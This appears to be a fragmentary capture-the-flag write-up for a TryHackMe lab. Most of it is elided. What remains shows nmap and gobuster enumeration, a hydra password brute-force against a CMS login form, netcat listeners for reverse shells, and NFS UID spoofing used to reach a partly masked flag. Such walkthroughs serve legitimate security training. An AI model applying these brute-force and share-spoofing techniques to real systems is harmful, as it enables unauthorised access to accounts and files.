...
```
bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ sudo nmap -A -sS -sC -sV -O 10.10.59.152
...
```
bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ gobuster vhost -u http://undiscovered.thm/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Gobuster v3.0.1
...
```
bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong" -f
...
```
bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ nc -lvnp 9001
...
bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ stty raw -echo
bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ nc -lvnp 9001
...
```
bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ sudo useradd -u 3003 william
bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ sudo useradd -u 1002 leonard

bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ sudo passwd william
New password:
Retype new password:
passwd: password updated successfully

bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ sudo passwd leonard
New password:
Retype new password:
passwd: password updated successfully

bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ sudo mkdir -p /mnt/undiscoverd/william
bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ sudo mkdir -p /mnt/undiscoverd/leonard
```

```
bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ sudo usermod -aG sudo leonard
bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ sudo usermod -aG sudo william
```
...
```
bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ sudo mount -t nfs 10.10.141.31:/home/william /mnt/undiscoverd/william
[sudo] password for kali:
bibo318@parrot:~/CTFs/tryhackme/Undiscovered$ sudo su william
$ 123
sh: 1: 123: not found
$ /bin/bash
...
THM{V0N318*****8d7b7299cccd1796a61915901d0e091c}
```
...
`THM{V0N318*****8d7b7299cccd1796a61915901d0e091c12**123:))}`
